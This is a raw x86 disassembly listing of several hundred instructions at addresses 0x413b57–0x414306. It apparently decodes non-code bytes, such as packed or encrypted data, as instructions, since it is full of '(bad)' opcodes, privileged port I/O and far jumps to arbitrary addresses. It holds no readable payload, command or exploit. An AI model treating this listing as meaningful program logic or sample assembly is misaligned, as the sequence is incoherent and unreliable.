  413b57:	lods   eax,DWORD PTR ds:[esi]
  413b58:	sbb    dl,dh
  413b5a:	hlt    
  413b5b:	xor    al,0x55
  413b5d:	mov    ch,0x74
  413b5f:	(bad)  
  413b60:	(bad)  
  413b61:	jae    0x413b59
  413b63:	(bad)
  413b67:	sub    eax,DWORD PTR [esi-0x49d58bb0]
  413b6d:	leave  
  413b6e:	mov    bh,0x72
  413b70:	in     eax,dx
  413b71:	test   al,0xe6
  413b73:	(bad)  [eax]
  413b75:	aas    
  413b76:	push   edi
  413b77:	jg     0x413bb2
  413b79:	cmp    dl,BYTE PTR [ecx+edi*4-0x1e]
  413b7d:	es jne 0x413b73
  413b80:	(bad)  
  413b81:	mul    ebx
  413b83:	(bad)  
  413b85:	mov    eax,edi
  413b87:	ss fidiv WORD PTR gs:[esi+0x561fcebf]
  413b8f:	cmc    
  413b90:	(bad)  
  413b91:	jbe    0x413bab
  413b93:	cs push ss
  413b95:	adc    eax,0x2f9b4239
  413b9a:	imul   BYTE PTR [esi+0x5421134a]
  413ba0:	fld1   
  413ba2:	or     al,BYTE PTR [esi+0x23]
  413ba5:	(bad)  
  413ba6:	mov    eax,0x3eb276
  413bab:	jmp    0x6d7e:0xe3f030d7
  413bb2:	fs xor al,0x94
  413bb5:	inc    edi
  413bb6:	test   al,0xa2
  413bb8:	cld    
  413bb9:	out    0x57,eax
  413bbb:	jne    0x413c00
  413bbd:	dec    esi
  413bbe:	in     eax,0x9c
  413bc0:	jecxz  0x413b4c
  413bc2:	stc    
  413bc3:	outs   dx,DWORD PTR ds:[esi]
  413bc4:	lock dec ebx
  413bc6:	ror    DWORD PTR [eax+0x361ba5af],0xc7
  413bcd:	pop    eax
  413bce:	sti    
  413bcf:	sub    ebx,0x2fe933e3
  413bd5:	push   edi
  413bd6:	(bad)  
  413bd7:	pusha  
  413bd8:	xor    al,0xe5
  413bda:	mov    ch,0x37
  413bdc:	adc    BYTE PTR [ecx],cl
  413bde:	fild   WORD PTR [edi+0x9dc4488]
  413be4:	mov    edi,0xed60b1b3
  413be9:	mov    esp,0x96b22c01
  413bee:	inc    eax
  413bef:	addr16 ret 0xdf69
  413bf3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf5:	or     esp,DWORD PTR ds:0x474822a7
  413bfb:	adc    ah,BYTE PTR [eax]
  413bfd:	push   ebp
  413bfe:	mov    bh,0x28
  413c00:	aas    
  413c01:	cli    
  413c02:	jmp    0xfbd49625
  413c07:	ror    DWORD PTR [si+0x66],1
  413c0b:	jp     0x413bdc
  413c0d:	nop
  413c0e:	push   esi
  413c0f:	jl     0x413c65
  413c11:	shr    DWORD PTR [edx],0x5a
  413c14:	sbb    al,0x6b
  413c16:	and    esp,edx
  413c18:	loop   0x413c15
  413c1a:	jno    0x413c22
  413c1c:	mov    al,0x44
  413c1e:	inc    ebp
  413c1f:	scas   al,BYTE PTR es:[edi]
  413c20:	into   
  413c21:	and    eax,0xf4415520
  413c26:	inc    edi
  413c27:	sub    BYTE PTR [ecx-0x3f391db6],0x8c
  413c2e:	jmp    0x413c62
  413c30:	jg     0x413c39
  413c32:	out    0x90,al
  413c34:	mov    edi,0x6c564d61
  413c39:	dec    esp
  413c3a:	ja     0x413c0d
  413c3c:	xlat   BYTE PTR ds:[ebx]
  413c3d:	inc    ebp
  413c3e:	push   ebx
  413c3f:	fmul   st,st(7)
  413c41:	xchg   esp,ebp
  413c43:	test   eax,0xe803e660
  413c48:	sti    
  413c49:	jbe    0x413c43
  413c4b:	aad    0x52
  413c4d:	arpl   WORD PTR [edi+0x4e8c7c8b],bp
  413c53:	cmp    DWORD PTR [ebx-0x6b],esi
  413c56:	jg     0x413ca8
  413c58:	push   ds
  413c59:	loopne 0x413cd6
  413c5b:	pop    esi
  413c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5d:	mov    ds:0x3d8bd275,al
  413c62:	xchg   DWORD PTR [esi-0x80],ebx
  413c65:	xor    ah,bh
  413c67:	pop    esp
  413c68:	(bad)
  413c6b:	xor    BYTE PTR [edx+0x402bc9d1],dh
  413c71:	lahf   
  413c72:	sub    DWORD PTR [ebx],esp
  413c74:	mov    ch,0x10
  413c76:	and    eax,0xf7735bb8
  413c7b:	pop    ss
  413c7c:	scas   eax,DWORD PTR es:[edi]
  413c7d:	mov    ecx,eax
  413c7f:	call   0xc3e29e25
  413c84:	push   edx
  413c85:	(bad)  
  413c86:	daa    
  413c87:	mov    ds:0x149f6398,eax
  413c8c:	xchg   BYTE PTR [esi-0x6e196fa5],al
  413c92:	(bad)  
  413c93:	sub    ebx,eax
  413c95:	jge    0x413d09
  413c97:	mov    dl,ah
  413c99:	or     eax,0x2f44154d
  413c9e:	dec    edi
  413c9f:	inc    edx
  413ca0:	inc    esi
  413ca1:	aas    
  413ca2:	cwde   
  413ca3:	addr16 xchg cl,ah
  413ca6:	cmc    
  413ca7:	add    eax,0x66b6ce54
  413cac:	fild   WORD PTR [ebx-0x11]
  413caf:	dec    esp
  413cb0:	jbe    0x413c35
  413cb2:	fsub   DWORD PTR [ecx]
  413cb4:	fild   QWORD PTR [edi+0x2fbc3df7]
  413cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cbb:	shl    BYTE PTR [edx-0x31],cl
  413cbe:	mov    WORD PTR [edx],ds
  413cc0:	cld    
  413cc1:	leave  
  413cc2:	pop    ebp
  413cc3:	sti    
  413cc4:	pop    esp
  413cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cc6:	fimul  WORD PTR [ecx]
  413cc8:	jp     0x413c7f
  413cca:	mov    DWORD PTR [edx+0x3e],eax
  413ccd:	cmc    
  413cce:	push   ds
  413ccf:	fadd   DWORD PTR [esi+0x32]
  413cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd3:	rcl    dh,cl
  413cd5:	retf   0x2784
  413cd8:	jnp    0x413d29
  413cda:	sti    
  413cdb:	pop    ds
  413cdc:	adc    cl,BYTE PTR [edi+eax*2+0x6f]
  413ce0:	outs   dx,DWORD PTR ds:[esi]
  413ce1:	mov    edi,0xc90a8d7b
  413ce6:	mov    al,ds:0x3a4fb312
  413ceb:	retf   
  413cec:	std    
  413ced:	ins    BYTE PTR es:[edi],dx
  413cee:	mov    DWORD PTR [ebp-0x17329d49],edx
  413cf4:	out    0x44,eax
  413cf6:	xchg   esp,eax
  413cf7:	out    dx,eax
  413cf8:	mov    edx,ebp
  413cfa:	js     0x413d2d
  413cfc:	push   ecx
  413cfd:	xor    bh,ah
  413cff:	inc    edx
  413d00:	loope  0x413cea
  413d02:	jmp    0xd103:0x9286d1a8
  413d09:	ins    DWORD PTR es:[edi],dx
  413d0a:	and    esi,esp
  413d0c:	dec    ebp
  413d0d:	and    ebx,0xc5ae42e2
  413d13:	mov    db6,esi
  413d16:	nop
  413d17:	mov    esp,?
  413d19:	xchg   esp,eax
  413d1a:	sub    DWORD PTR [esi-0x14],esi
  413d1d:	in     al,dx
  413d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d1f:	repz pop eax
  413d21:	shl    BYTE PTR [edi],1
  413d23:	or     al,ch
  413d25:	adc    eax,0x7868c06a
  413d2a:	mov    ecx,0x7e85417a
  413d2f:	ja     0x413d35
  413d31:	enter  0x4679,0xf1
  413d35:	dec    ebx
  413d36:	push   edx
  413d37:	jmp    0x413d85
  413d39:	outs   dx,DWORD PTR ds:[esi]
  413d3a:	fnstenv [ebx+edx*2]
  413d3d:	xor    eax,0x19a3cc2
  413d42:	inc    eax
  413d43:	jne    0x413ceb
  413d45:	mov    ebx,0xbe2200da
  413d4a:	mov    al,0x7a
  413d4c:	inc    esi
  413d4d:	jg     0x413d78
  413d4f:	icebp  
  413d50:	jb     0x413d88
  413d52:	lock fild DWORD PTR [edx+0x20241fc0]
  413d59:	push   ebp
  413d5a:	stos   DWORD PTR es:[edi],eax
  413d5b:	int    0x43
  413d5d:	lea    ecx,[esi-0x83027eb]
  413d63:	mov    ebp,0xa4e5cc53
  413d68:	sbb    bl,BYTE PTR [eax+0x3f]
  413d6b:	sbb    eax,ecx
  413d6d:	push   edx
  413d6e:	fwait
  413d6f:	sbb    al,0xf0
  413d71:	pop    esp
  413d72:	push   0x6b
  413d74:	ins    BYTE PTR es:[edi],dx
  413d75:	clc    
  413d76:	and    esp,esp
  413d78:	lods   eax,DWORD PTR ds:[esi]
  413d79:	mov    ebp,0xa6779fb5
  413d7e:	bnd jl 0x413d5e
  413d81:	retf   
  413d82:	in     al,dx
  413d83:	daa    
  413d84:	gs or  eax,0x973b9c4c
  413d8a:	mov    ah,0x57
  413d8c:	sti    
  413d8d:	xlat   BYTE PTR ds:[ebx]
  413d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d8f:	push   0x4a
  413d91:	shl    BYTE PTR [edx],0x56
  413d94:	in     al,0x59
  413d96:	ret    
  413d97:	(bad)  
  413d98:	lahf   
  413d99:	jl     0x413dd0
  413d9b:	dec    ecx
  413d9c:	les    ecx,FWORD PTR [eax-0x2e]
  413d9f:	daa    
  413da0:	mov    BYTE PTR [edx-0x1d],al
  413da3:	jns    0x413e0c
  413da5:	aad    0x3e
  413da7:	cld    
  413da8:	mov    ebx,0xdb36c532
  413dad:	aas    
  413dae:	rcl    DWORD PTR [esi-0x3fb5fa33],0x2d
  413db5:	adc    al,0x9
  413db7:	sbb    eax,0x1d7353c1
  413dbc:	test   al,0x4e
  413dbe:	shl    BYTE PTR [ebx],cl
  413dc0:	adc    eax,0x9bc43904
  413dc5:	(bad)  
  413dc6:	add    BYTE PTR [eax+0xb411803],ah
  413dcc:	aam    0x59
  413dce:	dec    edx
  413dcf:	add    DWORD PTR [edx-0x7cbe054c],esi
  413dd5:	jbe    0x413e4c
  413dd7:	in     al,0xd4
  413dd9:	icebp  
  413dda:	xchg   ebx,eax
  413ddb:	test   eax,0xa71d6bd4
  413de0:	call   0xf5ef7da1
  413de5:	retf   
  413de6:	cmp    BYTE PTR [ebp-0x1d],bl
  413de9:	call   0x7ae0:0x7431927d
  413df0:	out    dx,al
  413df1:	push   ebx
  413df2:	loope  0x413e32
  413df4:	xor    DWORD PTR [edi-0x1d686ad0],esp
  413dfa:	(bad)  
  413dfb:	sbb    BYTE PTR [ecx],dh
  413dfd:	jae    0x413e7e
  413dff:	mov    ch,0x8e
  413e01:	(bad)  
  413e02:	mov    WORD PTR [edx],?
  413e04:	or     dh,0x2f
  413e07:	push   esp
  413e08:	and    al,BYTE PTR [edx+0x69]
  413e0b:	adc    bl,0x71
  413e0e:	psrad  mm3,QWORD PTR [edx+0x1a]
  413e12:	pop    esp
  413e13:	gs pop ebp
  413e15:	adc    al,0xc7
  413e17:	mov    esi,0x62504a03
  413e1c:	add    dl,cl
  413e1e:	into   
  413e1f:	lahf   
  413e20:	pop    ss
  413e21:	outs   dx,DWORD PTR ds:[esi]
  413e22:	enter  0xceb2,0xf0
  413e26:	dec    esp
  413e27:	rcr    BYTE PTR [esi-0x170c70ab],0x71
  413e2e:	aas    
  413e2f:	dec    esi
  413e30:	or     BYTE PTR [edx+0x7677d21a],bh
  413e36:	sar    BYTE PTR [edi-0x7a],1
  413e39:	add    esp,ebx
  413e3b:	cmc    
  413e3c:	shr    DWORD PTR [edx],cl
  413e3e:	scas   eax,DWORD PTR es:[edi]
  413e3f:	adc    DWORD PTR [esi],ecx
  413e41:	or     bh,BYTE PTR [eax]
  413e43:	dec    eax
  413e44:	pushf  
  413e45:	xchg   ebx,eax
  413e47:	inc    edi
  413e48:	fmul   st(5),st
  413e4a:	mov    WORD PTR fs:[ecx-0x636caf3f],es
  413e51:	jnp    0x413eba
  413e53:	ror    DWORD PTR [ebx],0x84
  413e56:	push   eax
  413e57:	aas    
  413e58:	mov    WORD PTR [eax],ss
  413e5a:	push   DWORD PTR [ebp-0x22c06e78]
  413e60:	sub    eax,edx
  413e62:	xor    eax,0xd2ef9894
  413e67:	ja     0x413ebc
  413e69:	out    dx,al
  413e6a:	or     bl,ah
  413e6c:	xor    ecx,DWORD PTR es:[esi-0x2e]
  413e70:	ss or  al,bh
  413e73:	jmp    0xcb8b:0x9d7bddf7
  413e7a:	repz xchg esi,eax
  413e7c:	loope  0x413ea3
  413e7e:	scas   eax,DWORD PTR es:[edi]
  413e7f:	push   cs
  413e80:	xchg   ebx,eax
  413e81:	and    esi,0x25
  413e84:	xlat   BYTE PTR ds:[ebx]
  413e85:	retf   0x48a6
  413e88:	(bad)  
  413e89:	and    ecx,DWORD PTR [esi+esi*8]
  413e8c:	push   eax
  413e8d:	sti    
  413e8e:	cmc    
  413e8f:	sti    
  413e90:	call   0x93b180cd
  413e95:	jge    0x413eea
  413e97:	add    bl,bh
  413e99:	sbb    BYTE PTR [ecx-0x40],ch
  413e9c:	sub    esp,DWORD PTR [eax]
  413e9e:	cmp    eax,0xfe2d1d3b
  413ea3:	leave  
  413ea4:	push   ecx
  413ea5:	out    0xe0,eax
  413ea7:	sbb    BYTE PTR [edx+0x113a1b49],bh
  413ead:	xchg   ebp,eax
  413eae:	lds    esi,FWORD PTR [eax-0x3]
  413eb1:	and    eax,0x845c6200
  413eb6:	or     al,BYTE PTR [ebp-0x38]
  413eb9:	mov    eax,0x7e5395b1
  413ebe:	popa   
  413ebf:	push   edx
  413ec0:	arpl   WORD PTR [edi+0x28],sp
  413ec3:	and    DWORD PTR [edi],ecx
  413ec5:	into   
  413ec6:	je     0x413f35
  413ec8:	and    BYTE PTR [edi+0x47b69d56],ah
  413ece:	push   edx
  413ecf:	lock dec edi
  413ed1:	call   0x1b620a95
  413ed6:	(bad)  
  413ed7:	test   al,0x48
  413ed9:	(bad)  [esi+0x77e5b5ec]
  413edf:	cmp    al,0x72
  413ee1:	dec    ecx
  413ee2:	fcom   QWORD PTR [edi+0x7f0a8d9f]
  413ee8:	or     ch,BYTE PTR [edx+ebx*4+0x48cc9e6e]
  413eef:	clc    
  413ef0:	jno    0x413edb
  413ef2:	daa    
  413ef3:	mov    ah,0x9f
  413ef5:	and    ebx,DWORD PTR [ebx]
  413ef7:	pop    ebp
  413ef8:	mov    esp,0x5bd5997d
  413efd:	or     DWORD PTR [ebp+0x1f],edi
  413f00:	pop    es
  413f01:	pop    ss
  413f02:	xor    DWORD PTR [edx],esp
  413f04:	adc    ecx,DWORD PTR [ecx+0x7e]
  413f07:	pop    edi
  413f08:	mov    ah,0x5f
  413f0a:	repnz adc al,0x6e
  413f0d:	jb     0x413efc
  413f0f:	add    al,0x2d
  413f11:	sub    eax,DWORD PTR [edi]
  413f13:	cli    
  413f14:	pop    esi
  413f15:	mov    bh,0x74
  413f17:	xchg   esi,eax
  413f18:	gs inc edx
  413f1a:	mov    bh,0x15
  413f1c:	jg     0x413f26
  413f1e:	rol    DWORD PTR [esi],0xfc
  413f21:	dec    ecx
  413f22:	mov    al,0x86
  413f24:	cmp    al,0x9b
  413f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f27:	sar    DWORD PTR [ebp-0x641178f8],0x7d
  413f2e:	daa    
  413f2f:	mov    ds:0x6f492cf5,al
  413f34:	mov    al,ds:0x92af2d6d
  413f39:	sbb    BYTE PTR [esi],0xcc
  413f3c:	inc    eax
  413f3d:	or     ch,BYTE PTR [ebx+0xba7c91a]
  413f43:	add    al,BYTE PTR [edx-0x18]
  413f46:	inc    edi
  413f47:	adc    al,0x4b
  413f49:	dec    ebx
  413f4a:	loope  0x413ed3
  413f4c:	xchg   esp,eax
  413f4d:	adc    edi,esi
  413f4f:	ds xor al,0x4
  413f52:	or     ebp,DWORD PTR [ecx]
  413f54:	pop    esi
  413f55:	mov    dl,0xc
  413f57:	(bad)  [ebx+ebp*1-0x39046209]
  413f5e:	jge    0x413f6a
  413f60:	jne    0x413faa
  413f62:	adc    ah,ah
  413f64:	adc    eax,DWORD PTR [edx-0x4a30e8b]
  413f6a:	fs or  al,0xf5
  413f6d:	loop   0x413f99
  413f6f:	xor    al,0x25
  413f71:	xchg   ecx,eax
  413f72:	sbb    BYTE PTR [ebx],bl
  413f74:	or     DWORD PTR ss:[ebx],ebx
  413f77:	sbb    eax,ebp
  413f79:	(bad)  
  413f7a:	aas    
  413f7b:	fdivr  QWORD PTR [edi+0x7a85a57c]
  413f81:	inc    edx
  413f82:	ins    BYTE PTR es:[edi],dx
  413f83:	jbe    0x413fd1
  413f85:	(bad)  
  413f86:	mov    ecx,DWORD PTR [ebp-0x74e4a8bf]
  413f8c:	cs sti 
  413f8e:	pop    edx
  413f8f:	into   
  413f90:	add    eax,0x83e1b039
  413f95:	rcl    DWORD PTR [ebp+0x54f92f9a],cl
  413f9b:	xchg   esi,eax
  413f9c:	ins    BYTE PTR es:[edi],dx
  413f9d:	push   edi
  413f9e:	xor    BYTE PTR [edi-0x48e7362b],0x5b
  413fa5:	jne    0x413f80
  413fa7:	out    dx,al
  413fa8:	jmp    0xe114:0xf1e8d760
  413faf:	xor    bh,bh
  413fb1:	sahf   
  413fb2:	pop    esi
  413fb3:	imul   esp,DWORD PTR [edi],0xdcc15a4
  413fb9:	les    edi,FWORD PTR [edx]
  413fbb:	mov    edx,0x49e08745
  413fc0:	push   ss
  413fc1:	js     0x413ffe
  413fc3:	gs je  0x413fed
  413fc6:	mov    esp,0xc7534e1
  413fcb:	inc    ecx
  413fcc:	test   eax,0xb33e2511
  413fd1:	add    BYTE PTR [eax+eax*2+0x1c11e8cc],cl
  413fd8:	push   edi
  413fd9:	test   al,0x7e
  413fdb:	es cdq 
  413fdd:	xchg   esi,eax
  413fde:	int    0x7c
  413fe0:	in     al,dx
  413fe1:	sub    al,0xa3
  413fe3:	shl    BYTE PTR [ecx],1
  413fe5:	mov    ds:0xa369f7a3,al
  413fea:	push   ss
  413feb:	data16 jae 0x413ff5
  413fee:	pop    edx
  413fef:	and    edx,ebp
  413ff1:	fidivr WORD PTR [esi+0x38]
  413ff4:	aad    0xf4
  413ff6:	mov    ch,0x4e
  413ff8:	bound  edi,QWORD PTR [esi-0x77cf8de6]
  413ffe:	lock inc edx
  414000:	sbb    DWORD PTR [ebx],ecx
  414002:	fidiv  DWORD PTR [ebp+0x69bdbee6]
  414008:	and    al,0x65
  41400a:	push   ecx
  41400b:	lods   eax,DWORD PTR ds:[esi]
  41400c:	or     DWORD PTR [edx],edi
  41400e:	lods   al,BYTE PTR ds:[esi]
  41400f:	repz scas al,BYTE PTR es:[edi]
  414011:	mov    ecx,0x9b477f72
  414016:	leave  
  414017:	lock fmul st,st(2)
  41401a:	xchg   ecx,eax
  41401b:	pusha  
  41401c:	retf   
  41401d:	pop    es
  41401e:	mov    eax,ds:0xbb01d7fc
  414023:	fcmovnb st,st(0)
  414025:	test   BYTE PTR [ebx],0x14
  414028:	inc    edi
  414029:	mov    al,ds:0x5e508b88
  41402e:	inc    edx
  41402f:	and    al,0x50
  414031:	and    eax,0xaf73dbf3
  414036:	jmp    0x7fa5:0x78181658
  41403d:	nop
  41403e:	and    BYTE PTR [ecx+0x50],bh
  414041:	div    DWORD PTR [eax-0xd]
  414044:	sub    eax,0x14d15d20
  414049:	xchg   BYTE PTR [ebp-0x5d66a10b],bl
  41404f:	icebp  
  414050:	inc    edi
  414051:	sub    al,0x29
  414053:	xchg   edx,eax
  414054:	imul   edi,DWORD PTR [ebp-0x75c30ab3],0x1e
  41405b:	add    eax,0x4421ac30
  414060:	mov    al,ds:0x37f15f3
  414065:	scas   eax,DWORD PTR es:[edi]
  414066:	cs pop es
  414068:	inc    ebx
  414069:	mov    esi,DWORD PTR [eax]
  41406b:	cli    
  41406c:	dec    esi
  41406d:	enter  0xa45e,0x74
  414071:	ja     0x41401c
  414073:	xchg   BYTE PTR [edx+0x51abbb2f],al
  414079:	pop    edx
  41407a:	mov    ds,ecx
  41407c:	and    bh,BYTE PTR [ebx+eax*2+0xe]
  414080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414081:	cli    
  414082:	jecxz  0x414050
  414084:	ret    
  414085:	orps   xmm2,XMMWORD PTR [ebx+ecx*4+0x25ec7118]
  41408d:	mov    ah,0x8a
  41408f:	stos   DWORD PTR es:[edi],eax
  414090:	hlt    
  414091:	in     eax,0x65
  414093:	and    al,0xd5
  414095:	sub    ebp,DWORD PTR ds:0x551e04d0
  41409b:	mov    bh,0x9
  41409d:	and    al,0x7f
  41409f:	sbb    ebp,DWORD PTR [eax+0x7ec9d348]
  4140a5:	test   DWORD PTR [ebx+0x4d],edx
  4140a8:	out    0x6e,eax
  4140aa:	push   0x1b
  4140ac:	ja     0x414053
  4140ae:	or     ebx,DWORD PTR [ecx+ecx*2-0x101e9548]
  4140b5:	push   eax
  4140b6:	test   eax,0x687be2b1
  4140bb:	adc    bh,BYTE PTR [eax+edx*4+0x56]
  4140bf:	inc    esp
  4140c0:	push   cs
  4140c1:	(bad)  
  4140c2:	mov    eax,0x4fa54080
  4140c7:	sbb    ah,BYTE PTR [ecx]
  4140c9:	jge    0x41404d
  4140cb:	sbb    BYTE PTR [ebp+0x56d49142],0x83
  4140d2:	aam    0x8c
  4140d4:	shr    eax,cl
  4140d6:	in     al,dx
  4140d7:	shl    BYTE PTR [edx+0x22],0x47
  4140db:	test   ebx,esi
  4140dd:	and    eax,0xce5ff98e
  4140e2:	in     eax,dx
  4140e3:	xor    ecx,ebp
  4140e5:	jne    0x41412f
  4140e7:	outs   dx,BYTE PTR ds:[esi]
  4140e8:	sbb    eax,0x813eed37
  4140ed:	les    esi,FWORD PTR [ecx-0x6c324d7d]
  4140f3:	js     0x41416d
  4140f5:	dec    esp
  4140f6:	jge    0x4140dc
  4140f8:	sub    dl,ah
  4140fa:	ret    0x9953
  4140fd:	fnstenv [esp+ebp*4]
  414100:	push   0x4f6fcdbf
  414105:	mov    dl,0x14
  414107:	stos   DWORD PTR es:[edi],eax
  414108:	daa    
  414109:	push   eax
  41410a:	int3   
  41410b:	(bad)  
  41410c:	xchg   esi,eax
  41410d:	lods   eax,DWORD PTR ds:[esi]
  41410e:	popa   
  41410f:	adc    ah,BYTE PTR [ebx-0x12]
  414112:	sbb    BYTE PTR [eax],dl
  414114:	mov    ah,0xa1
  414116:	daa    
  414117:	repz loop 0x4140bc
  41411a:	adc    ch,ah
  41411c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411d:	or     eax,0x47a7b4cd
  414122:	or     al,0x0
  414124:	std    
  414125:	cmp    al,0x1d
  414127:	cdq    
  414128:	int3   
  414129:	jmp    0x41414a
  41412b:	pop    es
  41412c:	retf   
  41412d:	push   ebx
  41412e:	add    DWORD PTR [ecx+0x7a456d0b],ebx
  414134:	out    dx,eax
  414135:	ds addr16 mov ch,0xc
  414139:	xchg   ebx,eax
  41413a:	add    bl,BYTE PTR [ebx]
  41413c:	dec    eax
  41413d:	stos   BYTE PTR es:[edi],al
  41413e:	out    0xa7,eax
  414140:	add    bh,BYTE PTR [edx-0x14]
  414143:	pop    esi
  414144:	adc    bh,BYTE PTR [ebx+ebx*8]
  414147:	jp     0x414105
  414149:	mov    dl,0xac
  41414b:	lock pushf 
  41414d:	mov    eax,0x1e2547d3
  414152:	mov    ebx,0x4fd5f814
  414157:	call   0x66a6:0xd28ced5d
  41415e:	test   BYTE PTR [ebx],0x29
  414161:	popa   
  414162:	out    0x29,al
  414164:	push   esi
  414165:	retf   
  414166:	bnd jae 0x414163
  414169:	sub    BYTE PTR ds:[ebx-0x7a],cl
  41416d:	dec    edi
  41416e:	jmp    0xbc4ee63c
  414173:	stc    
  414174:	add    ch,BYTE PTR [ecx+0x36]
  414177:	sbb    ah,bh
  414179:	push   edx
  41417a:	inc    esi
  41417b:	lock mov dh,0x4c
  41417e:	(bad)  
  41417f:	out    dx,eax
  414180:	inc    esi
  414181:	dec    ecx
  414182:	frstor [eax+0x407c68cf]
  414188:	ja     0x414197
  41418a:	sbb    BYTE PTR [edx],0x15
  41418d:	push   esp
  41418e:	add    bl,BYTE PTR [eax+0x67337722]
  414194:	arpl   di,dx
  414196:	int    0x83
  414198:	sub    ecx,DWORD PTR [eax+0x7d]
  41419b:	fisttp DWORD PTR [ecx]
  41419d:	cmc    
  41419e:	push   edi
  41419f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a0:	adc    DWORD PTR [eax-0x57],esi
  4141a3:	mov    eax,ds:0xcdd20f6c
  4141a8:	pop    edi
  4141a9:	shl    DWORD PTR [ebp+0x39],1
  4141ac:	es jo  0x41417f
  4141af:	mov    esp,0xc0dfd48
  4141b4:	push   0xffffffa2
  4141b6:	push   eax
  4141b7:	pop    esp
  4141b8:	out    dx,eax
  4141b9:	adc    al,0x27
  4141bb:	jge    0x4141a8
  4141bd:	fist   DWORD PTR [ebx-0x6d]
  4141c0:	(bad)  
  4141c1:	push   ss
  4141c2:	aas    
  4141c3:	lock mov bh,0xaf
  4141c6:	test   eax,0x423f3843
  4141cb:	mov    eax,fs
  4141cd:	jne    0x41422a
  4141cf:	pusha  
  4141d0:	add    edx,DWORD PTR [eax+0x11acd155]
  4141d6:	sub    DWORD PTR [ebx],0x16
  4141d9:	in     eax,dx
  4141da:	sub    edx,esi
  4141dc:	bswap  ecx
  4141de:	dec    eax
  4141df:	add    eax,0xe5d8cc5a
  4141e4:	dec    edx
  4141e5:	push   esp
  4141e6:	or     ecx,esp
  4141e8:	mov    WORD PTR [edi+edx*8-0x6a],cs
  4141ec:	sub    DWORD PTR [ebx+0x17],edx
  4141ef:	data16 xlat BYTE PTR ds:[ebx]
  4141f1:	rcr    DWORD PTR [eax-0x2a],0x2b
  4141f5:	out    dx,eax
  4141f6:	ja     0x4141aa
  4141f8:	or     al,0x85
  4141fa:	xchg   ebp,eax
  4141fb:	jp     0x414186
  4141fd:	scas   al,BYTE PTR es:[edi]
  4141fe:	into   
  4141ff:	aam    0x82
  414201:	int    0x9e
  414203:	mov    ds:0x80df42f5,eax
  414208:	stc    
  414209:	pop    ebx
  41420a:	arpl   WORD PTR [edx],sp
  41420c:	xchg   edi,eax
  41420d:	mov    ds:0x71cd1f42,al
  414212:	pop    ss
  414213:	fistp  WORD PTR [ecx+eiz*4-0x5bff990]
  41421a:	pop    esi
  41421b:	mov    esp,0x37b8c5b7
  414220:	adc    edx,DWORD PTR [ebx]
  414222:	push   ds
  414223:	ficomp WORD PTR [ebx+ebx*1-0x4106f31a]
  41422a:	push   esp
  41422b:	lock retf 0x8db4
  41422f:	or     BYTE PTR [esi-0x15363fbd],ch
  414235:	out    0xf3,eax
  414237:	(bad)  
  414238:	aas    
  414239:	inc    esi
  41423a:	push   ds
  41423b:	mov    ds:0x30bbc293,al
  414240:	enter  0xc65c,0xb9
  414244:	loopne 0x41428e
  414246:	jge    0x4141cd
  414248:	clc    
  414249:	add    BYTE PTR [esi+edi*1],dh
  41424c:	inc    edx
  41424d:	push   ebp
  41424e:	xchg   esi,eax
  41424f:	lods   al,BYTE PTR ds:[esi]
  414250:	test   BYTE PTR [edi-0x41950b92],bl
  414256:	into   
  414257:	fisttp QWORD PTR [ecx]
  414259:	inc    esi
  41425a:	aaa    
  41425b:	hlt    
  41425c:	pop    esi
  41425d:	outs   dx,DWORD PTR ds:[esi]
  41425e:	pusha  
  41425f:	and    bh,BYTE PTR [ecx+0x74327ddd]
  414265:	mov    edx,0x8f743af7
  41426a:	xor    ebp,DWORD PTR [edi]
  41426c:	adc    ecx,DWORD PTR [edx+0x2b]
  41426f:	mov    dh,dl
  414271:	xchg   DWORD PTR [edi-0x7a],eax
  414274:	in     eax,0xd9
  414276:	jmp    0x414237
  414278:	cwde   
  414279:	out    dx,eax
  41427a:	add    eax,0xc0847d4b
  41427f:	jno    0x414286
  414281:	pusha  
  414282:	mov    DWORD PTR [eax-0x51392f07],eax
  414288:	sub    eax,0xc426272e
  41428d:	cmp    al,0x6c
  41428f:	aam    0xa9
  414291:	jl     0x414229
  414293:	fstp   QWORD PTR [eax-0x76]
  414296:	ins    BYTE PTR es:[edi],dx
  414297:	sub    al,0xac
  414299:	lahf   
  41429a:	xchg   ebx,eax
  41429b:	cmp    BYTE PTR [edi+0x65],bh
  41429e:	sub    BYTE PTR [edx+edx*2+0x64],ah
  4142a2:	and    ah,BYTE PTR [edi]
  4142a4:	out    dx,al
  4142a5:	test   DWORD PTR [esp+ebp*2-0x3b],edi
  4142a9:	jle    0x4142e3
  4142ab:	inc    ecx
  4142ac:	ret    0x793c
  4142af:	neg    DWORD PTR [esi]
  4142b1:	push   es
  4142b2:	cs mov ebx,ecx
  4142b5:	loop   0x4142e9
  4142b7:	mov    eax,0x754aa982
  4142bc:	push   0x39
  4142be:	mov    BYTE PTR [ecx],ch
  4142c0:	jg     0x4142af
  4142c2:	xchg   edi,eax
  4142c3:	adc    eax,0xf31149c2
  4142c8:	push   ebx
  4142c9:	adc    eax,0xa6185784
  4142ce:	fninit 
  4142d0:	stc    
  4142d1:	mov    al,BYTE PTR [esi-0x7aaf6565]
  4142d7:	xor    ecx,DWORD PTR [edi]
  4142d9:	mov    bl,0x77
  4142db:	icebp  
  4142dc:	jbe    0x41430e
  4142de:	sbb    DWORD PTR [eax],0xd7647b1f
  4142e4:	adc    eax,esi
  4142e6:	lods   eax,DWORD PTR ds:[esi]
  4142e7:	and    ch,0x88
  4142ea:	cmc    
  4142eb:	push   ecx
  4142ec:	pop    DWORD PTR [ebx+0x24]
  4142ef:	mov    dh,0x64
  4142f1:	cld    
  4142f2:	sbb    BYTE PTR [ecx-0xa],bh
  4142f5:	mov    eax,ds:0xa3b60275
  4142fa:	cmp    esp,edx
  4142fc:	mov    WORD PTR [eax+0x4f],?
  4142ff:	out    dx,eax
  414300:	add    ebx,0x8166591a
  414306:	pushf  
